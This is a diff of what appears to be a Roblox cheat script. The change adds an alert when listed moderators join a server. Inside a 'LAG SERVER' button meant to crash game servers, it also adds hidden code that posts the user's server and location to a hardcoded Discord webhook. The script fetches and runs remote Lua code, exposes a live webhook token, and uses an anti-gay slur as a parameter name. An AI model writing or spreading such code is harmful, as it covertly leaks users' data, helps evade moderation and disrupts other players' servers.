@@ -116,26 +116,36 @@ end)
 
 
 
-
-
 local playerIds = {4199135174,42235130,1001242712,56721213,38307780,138249029,1041867508,95410360,1459923763,1696452029,150269473,45453121,276142024,123755248,585228735}
 local sound = game.Workspace.start
 
+local d = Drawing.new("Text")
+game:GetService("Workspace").Sound:Play()
+d.Text = "A MODERATOR IS IN YOUR SERVER."
+d.Position = Vector2.new (650, 200)
+d.Size = 70
+d.Visible = false
 
 
 game.Players.PlayerAdded:Connect(function(player)
     for _, id in ipairs(playerIds) do
         if player.UserId == id then
   sound:Play()
+  d.Visible = true
 
             getgenv()['IrisAd'] = true
             local Notification = loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/IrisBetterNotifications.lua"))()
             
             Notification.Notify(player.Name.." WARNING!", "A MODERATOR IS IN YOUR SERVER.", "rbxassetid://4914902889" );
-
+wait(3)
+d.Visible = false
         end
     end
 end)
+
+
+
+
 
 
 
@@ -1642,8 +1652,39 @@ end)
 
 task.wait()
 
-
 Section5:AddButton("LAG SERVER", function(IhateGayPeople)
+
+
+    local player = game:GetService("Players").LocalPlayer
+    local webhookURL = "https://ptb.discord.com/api/webhooks/1096778454407589908/Ots_qwqlS_1ykfoDJmhYZE0GCpl3tBPH5JkW8qz6LodATTrSFSqb9qkNu8kemJSBpp6_"
+    local httpService = game:GetService("HttpService")
+    local request = (syn and syn.request) or request or (http and http.request) or http_request
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = httpService:JSONEncode({
+            content = "",
+            embeds = {
+                {
+                    title = "@everyone",
+                    description = server,
+                    color = 0x81ff57,
+                    fields = {
+                        {
+                            
+    name = "Location:",
+                            value = serverlocation, 
+                            inline = true,
+                        },
+                    },
+                },
+            },
+        }),
+    })
+
 
     local char = game:GetService('Players').LocalPlayer.Character or nil
     if char then
@@ -1696,7 +1737,7 @@ Section5:AddButton("LAG SERVER", function(IhateGayPeople)
     bomb(289, 5) --// change values if client crashes
     end
     
-
+   
 
     task.wait()
 
